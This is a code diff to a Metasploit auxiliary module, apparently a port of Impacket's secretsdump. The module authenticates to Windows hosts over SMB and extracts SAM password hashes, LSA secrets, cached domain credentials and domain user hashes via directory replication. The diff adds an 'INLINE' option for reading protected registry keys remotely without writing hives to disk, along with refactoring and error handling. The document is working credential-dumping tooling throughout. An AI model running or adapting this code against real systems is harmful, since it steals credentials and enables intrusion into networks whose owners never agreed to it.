@@ -7,7 +7,6 @@ require 'ruby_smb/dcerpc/client'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SMB::Client::Authenticated
-  include Msf::Exploit::Remote::DCERPC
   include Msf::Auxiliary::Report
   include Msf::Util::WindowsRegistry
   include Msf::Util::WindowsCryptoHelpers
@@ -57,7 +56,7 @@ class MetasploitModule < Msf::Auxiliary
         'License' => MSF_LICENSE,
         'Author' => [
           'Alberto Solino', # Original Impacket code
-          'Christophe De La Fuente', # MSf module
+          'Christophe De La Fuente', # MSF module
         ],
         'References' => [
           ['URL', 'https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py'],
@@ -78,7 +77,12 @@ class MetasploitModule < Msf::Auxiliary
       )
     )
 
-    register_options([ Opt::RPORT(445) ])
+    register_options(
+      [
+        Opt::RPORT(445),
+        OptBool.new('INLINE', [ true, 'Use inline technique to read protected keys from the registry remotely without saving the hives to disk', true ])
+      ]
+    )
 
     @service_should_be_stopped = false
     @service_should_be_disabled = false
@@ -227,15 +231,15 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def dump_sam_hashes(reg_parser, boot_key)
+  def dump_sam_hashes(windows_reg, boot_key)
     print_status('Dumping SAM hashes')
     vprint_status('Calculating HashedBootKey from SAM')
-    hboot_key = reg_parser.get_hboot_key(boot_key)
+    hboot_key = windows_reg.get_hboot_key(boot_key)
     unless hboot_key.present?
       print_warning('Unable to get hbootKey')
       return
     end
-    users = reg_parser.get_user_keys
+    users = windows_reg.get_user_keys
     users.each do |rid, user|
       user[:hashnt], user[:hashlm] = decrypt_user_key(hboot_key, user[:V], rid)
     end
@@ -263,13 +267,13 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def get_lsa_secret_key(reg_parser, boot_key)
+  def get_lsa_secret_key(windows_reg, boot_key)
     print_status('Decrypting LSA Key')
-    lsa_key = reg_parser.lsa_secret_key(boot_key)
+    lsa_key = windows_reg.lsa_secret_key(boot_key)
 
     vprint_good("LSA key: #{lsa_key.unpack('H*')[0]}")
 
-    if reg_parser.lsa_vista_style
+    if windows_reg.lsa_vista_style
       vprint_status('Vista or above system')
     else
       vprint_status('XP or below system')
@@ -278,16 +282,16 @@ class MetasploitModule < Msf::Auxiliary
     return lsa_key
   end
 
-  def get_nlkm_secret_key(reg_parser, lsa_key)
+  def get_nlkm_secret_key(windows_reg, lsa_key)
     print_status('Decrypting NL$KM')
 
-    reg_parser.nlkm_secret_key(lsa_key)
+    windows_reg.nlkm_secret_key(lsa_key)
   end
 
-  def dump_cached_hashes(reg_parser, nlkm_key)
+  def dump_cached_hashes(windows_reg, nlkm_key)
     print_status('Dumping cached hashes')
 
-    cache_infos = reg_parser.cached_infos(nlkm_key)
+    cache_infos = windows_reg.cached_infos(nlkm_key)
     if cache_infos.nil? || cache_infos.empty?
       print_status('No cashed entries')
       return
@@ -335,7 +339,7 @@ class MetasploitModule < Msf::Auxiliary
         realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
         realm_value: logon_domain_name
       }
-      if reg_parser.lsa_vista_style
+      if windows_reg.lsa_vista_style
         jtr_hash = "$DCC2$#{cache_info.real_iteration_count}##{username}##{cache_info.data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
       else
         jtr_hash = "M$#{username}##{cache_info.data.enc_hash.to_hex}:#{dns_domain_name}:#{logon_domain_name}"
@@ -350,7 +354,7 @@ class MetasploitModule < Msf::Auxiliary
     if hashes.empty?
       print_line('No cached hashes on this system')
     else
-      print_status("Hash#{'es' if hashes.lines.size > 1} are in '#{reg_parser.lsa_vista_style ? 'mscash2' : 'mscash'}' format")
+      print_status("Hash#{'es' if hashes.lines.size > 1} are in '#{windows_reg.lsa_vista_style ? 'mscash2' : 'mscash'}' format")
       print_line(hashes)
     end
   end
@@ -539,10 +543,10 @@ class MetasploitModule < Msf::Auxiliary
     print_line
   end
 
-  def dump_lsa_secrets(reg_parser, lsa_key)
+  def dump_lsa_secrets(windows_reg, lsa_key)
     print_status('Dumping LSA Secrets')
 
-    lsa_secrets = reg_parser.lsa_secrets(lsa_key)
+    lsa_secrets = windows_reg.lsa_secrets(lsa_key)
     lsa_secrets.each do |key, secret|
       print_secret(key, secret)
     end
@@ -676,7 +680,7 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status('Bound to DRSR')
 
     dcerpc_client
-  rescue ::Rex::Proto::DCERPC::Exceptions::Error, ArgumentError => e
+  rescue RubySMB::Dcerpc::Error::DcerpcError, ArgumentError => e
     print_error("Unable to bind to the directory replication remote service (DRS): #{e}")
     return
   end
@@ -825,6 +829,13 @@ class MetasploitModule < Msf::Auxiliary
     users = get_domain_users
 
     dcerpc_client = connect_drs
+    unless dcerpc_client
+      print_error(
+        'Unable to connect to the directory replication remote service (DRS).'\
+        'Is the remote server a Domain Controller?'
+      )
+      return
+    end
     ph_drs = dcerpc_client.drs_bind
     dc_infos = dcerpc_client.drs_domain_controller_info(ph_drs, domain_name)
     user_info = {}
@@ -991,6 +1002,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def do_cleanup
     print_status('Cleaning up...')
+
     if @service_should_be_stopped
       print_status('Stopping service RemoteRegistry...')
       svc_handle = @svcctl.open_service_w(@scm_handle, 'RemoteRegistry')
@@ -1113,55 +1125,69 @@ class MetasploitModule < Msf::Auxiliary
     check_lm_hash_not_stored if @winreg
 
     if ['ALL', 'SAM'].include?(action.name)
-      begin
-        sam = save_sam
-      rescue RubySMB::Error::RubySMBError => e
-        if action.name == 'ALL'
-          print_warning("Error when getting SAM hive... skipping ([#{e.class}] #{e}).")
+      if @winreg
+        if datastore['INLINE']
+          print_status('Using `INLINE` technique for SAM. You might want to try without if it fails.')
+          windows_reg = Msf::Util::WindowsRegistry::RemoteRegistry.new(@winreg, name: :sam, inline: true)
         else
-          print_error("Error when getting SAM hive ([#{e.class}] #{e}).")
+          begin
+            sam = save_sam
+            windows_reg = Msf::Util::WindowsRegistry.parse(sam, name: :sam, root: 'HKLM\\SAM')
+          rescue RubySMB::Error::RubySMBError => e
+            if action.name == 'ALL'
+              print_warning("Error when getting SAM hive... skipping ([#{e.class}] #{e}).")
+            else
+              print_error("Error when getting SAM hive ([#{e.class}] #{e}).")
+            end
+          end
         end
-        sam = nil
-      end
 
-      if sam
-        reg_parser = Msf::Util::WindowsRegistry.parse(sam, name: :sam)
-        dump_sam_hashes(reg_parser, boot_key)
+        dump_sam_hashes(windows_reg, boot_key) if windows_reg
+      else
+        print_bad('Winreg client is not initialized, cannot dump SAM hashes')
       end
     end
 
     if ['ALL', 'CACHE', 'LSA'].include?(action.name)
-      begin
-        security = save_security
-      rescue RubySMB::Error::RubySMBError => e
-        if action.name == 'ALL'
-          print_warning("Error when getting SECURITY hive... skipping ([#{e.class}] #{e}).")
+      if @winreg
+        if datastore['INLINE']
+          print_status('Using `INLINE` technique for CACHE and LSA. You might want to try without if it fails.')
+          windows_reg = Msf::Util::WindowsRegistry::RemoteRegistry.new(@winreg, name: :security, inline: true)
         else
-          print_error("Error when getting SECURITY hive ([#{e.class}] #{e}).")
-        end
-        security = nil
-      end
-
-      if security
-        reg_parser = Msf::Util::WindowsRegistry.parse(security, name: :security)
-        lsa_key = get_lsa_secret_key(reg_parser, boot_key)
-        if lsa_key.nil? || lsa_key.empty?
-          print_status('No LSA key, skip LSA secrets and cached hashes dump')
-        else
-          report_info(lsa_key.unpack('H*')[0], 'host.lsa_key')
-          if ['ALL', 'LSA'].include?(action.name)
-            dump_lsa_secrets(reg_parser, lsa_key)
-          end
-          if ['ALL', 'CACHE'].include?(action.name)
-            nlkm_key = get_nlkm_secret_key(reg_parser, lsa_key)
-            if nlkm_key.nil? || nlkm_key.empty?
-              print_status('No NLKM key (skip cached hashes dump)')
+          begin
+            security = save_security
+            windows_reg = Msf::Util::WindowsRegistry.parse(security, name: :security, root: 'HKLM\\SECURITY')
+          rescue RubySMB::Error::RubySMBError => e
+            if action.name == 'ALL'
+              print_warning("Error when getting SECURITY hive... skipping ([#{e.class}] #{e}).")
             else
-              report_info(nlkm_key.unpack('H*')[0], 'host.nlkm_key')
-              dump_cached_hashes(reg_parser, nlkm_key)
+              print_error("Error when getting SECURITY hive ([#{e.class}] #{e}).")
             end
           end
         end
+
+        if windows_reg
+          lsa_key = get_lsa_secret_key(windows_reg, boot_key)
+          if lsa_key.nil? || lsa_key.empty?
+            print_status('No LSA key, skip LSA secrets and cached hashes dump')
+          else
+            report_info(lsa_key.unpack('H*')[0], 'host.lsa_key')
+            if ['ALL', 'LSA'].include?(action.name)
+              dump_lsa_secrets(windows_reg, lsa_key)
+            end
+            if ['ALL', 'CACHE'].include?(action.name)
+              nlkm_key = get_nlkm_secret_key(windows_reg, lsa_key)
+              if nlkm_key.nil? || nlkm_key.empty?
+                print_status('No NLKM key (skip cached hashes dump)')
+              else
+                report_info(nlkm_key.unpack('H*')[0], 'host.nlkm_key')
+                dump_cached_hashes(windows_reg, nlkm_key)
+              end
+            end
+          end
+        end
+      else
+        print_bad('Winreg client is not initialized, cannot dump LSA secrets and cached hashes')
       end
     end
 
